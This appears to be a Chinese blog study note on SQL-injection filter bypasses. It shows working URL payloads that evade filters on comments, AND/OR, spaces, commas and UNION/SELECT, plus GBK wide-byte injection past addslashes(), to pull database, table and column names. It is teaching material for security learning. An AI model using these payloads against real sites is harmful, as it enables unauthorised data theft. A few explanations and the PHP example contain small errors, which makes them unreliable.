---
title: SQL注入过滤绕过
categories:
  - 学习
tags:
  - SQL注入
abbrlink: a7642d18
---

## 过滤注释符绕过

常见注释符`--` `#` `%23`

### 如何判断页面过滤对象

从最简单的注入命令开始，一步步增加复杂性，通过此方法判断过滤对象。

### 策略

1. **基础测试**：优先尝试 `--`、`#`、`%23`。
2. **闭合语句**：若注释符全被过滤，直接闭合引号或逻辑。
3. **编码与空白符**：尝试 URL 编码、换行符、TAB 符。

### 绕过方法

**闭合引号**

```
数字型
不用考虑闭合，正常使用语句即可
字符型
''单引号闭合只需要在后面增加一个单引号
""双引号闭合只需要在后面增加一个双引号
('')单引号括号闭合需要多加个 or('1')=('1
("")双引号括号闭合需要多加个 or("1")=("1
```

## 过滤`AND OR`绕过

`and or`

### 绕过方法

**大小写绕过**

`?id=1 anD 1=1 -- +`

**复写绕过**

`?id=1' anandd 1=1 -- +`

**取代**

`用&&取代and ，用||取代or`

若报错显示无法识别，则将`&&`和`||`用url编码替代

`&& url编码为%26%26`

`||url编码为%7c%7c`

## 空格过滤绕过

### 绕过方法

**使用+号代替空格**

**URL编码代替空格**

```
%20（标准URL编码）
%A0
%09
%0A
%0C
%0D
%0B

```

**改用报错注入**

```
过滤了and or 空格 注释符
?id=1000'||extractvalue(1,concat('~',(database()))||'1'='1   //没有用到空格，||绕过了or过滤，引号闭合绕过了注释符过滤
?id=1000'||extractvalue(1,concat('~',(select(group_concat(table_name)from(infoorrmation_schema.tables)where(table_schema=(database())))))||'1'='1 
//没有用到空格，||和复写(infoorrmation_shema)绕过了or过滤，引号闭合绕过了注释符过滤
```

## 逗号过滤绕过

逗号过滤之后无法使用`union select 1,2,3`

### 绕过方法

**`join`**

**功能**：合并两个或多个表的行，基于关联关系

**本质**：`join`是关联操作符，必须配合`on、using`或隐性关系关联逻辑

**保证`join`查询和`union select`列数必须完全相同**

**使用过程**

```sql
#提取数据库版本和当前用户
UNION SELECT * FROM (SELECT @@version)a JOIN (SELECT user())b
union select 1,2,3 
#等价于
union select *from (select 1)a JOIN (select 2) b JOIN (select 3)c
#如果页面显示 2 和 3，说明第 2、3 列可输出数据。
查询库名
UNION SELECT * FROM (SELECT 1) a 
JOIN (SELECT database()) b #第2列显示库名
JOIN (SELECT 3) c
查询表名
UNION SELECT * FROM (SELECT 1) a 
JOIN (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) b 
JOIN (SELECT 3) c 
查询字段名（例如查看 `users` 表的字段）
UNION SELECT * FROM (SELECT 1)a 
JOIN (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')b 
JOIN (SELECT 3)c 
```

## `select、union`过滤绕过

### 绕过方法

**大小写绕过**

```sql
过滤空格，union、select，注释符 
?id=1000'uNion%0AsElect%0A1,2,3%0Aor'1'=1
union select 通过大小写变化改为uNion和sElect
%0A为空格URL编码
'1'='1为绕过注释词过滤
```

**复写单词绕过**

```sql
过滤空格，union、select，注释符 
?id=1000'uunionnion%0Asselectelect%0A1,2,3%0Aor'1'=1
union select 通过大小写变化改为uunionnion和sselectelect
%0A为空格URL编码
'1'='1为绕过注释词过滤
```

**报错注入**

```sql
过滤空格，union、select，注释符 
?id=1000'||extractvalue(1,concat('~',(database()))||'1'='1   //没有用到空格，||绕过了or过滤，引号闭合绕过了注释符过滤
?id=1000'||extractvalue(1,concat('~',(select(group_concat(table_name)from(infoorrmation_schema.tables)where(table_schema=(database())))))||'1'='1 
//没有用到空格，||和复写(infoorrmation_shema)绕过了or过滤，引号闭合绕过了注释符过滤
```

**URL编码绕过**

## 宽字节注入绕过

### 前提

**要求数据库编码方式为GBK编码，并且发请求时声明客户端用到也是GBK编码**

### 对抗函数

**`addslashes()`**

**作用**：

检查用户提交参数是否有`''单引号""双引号 \反斜线与NUL(NULL字符)`，如果有，全部增加`\`，将符号实体化

**举例**:

```php+HTML
<php
$a='i am "ctfer"';
$b=addslashes($a);
// 此时 $b被赋值为 `i am \"ctfer"\`，""双引号失去了作用
如果提交的是1',那么将变为1\'，无法查询1'
```

### GBK编码

### 绕过原理

- **多字节编码特性**：
  在 GBK 编码中，某些字符由 **两个字节** 组成。例如：

  ```plaintext
  "運" 的 GBK 编码：0xdf 0x5c
  ```

  - **关键点**：第二个字节 `0x5c` 对应 ASCII 的 `\`（反斜杠）。

- **转义符号被“吞并”**：
  当用户输入 `%df'`（`%df` 是 `0xdf` 的 URL 编码）时：

  1. 转义函数将 `'` 转义为 `\'`，即 `%df%5c%27`。
  2. 数据库按 GBK 解码时，将 `%df%5c` 解析为完整字符（如 `運`），导致 `%27`（`'`）未被转义。
  3. 最终单引号 `'` 逃逸，引发注入。

### 绕过方法

```sql
?id=1%df' -- +
函数addslashes把'转义为\'
GBK编码%df\为一个数据库无法识别的中文，因此\符号失效
?id=0%df' union select 1,2,database() -- +
```

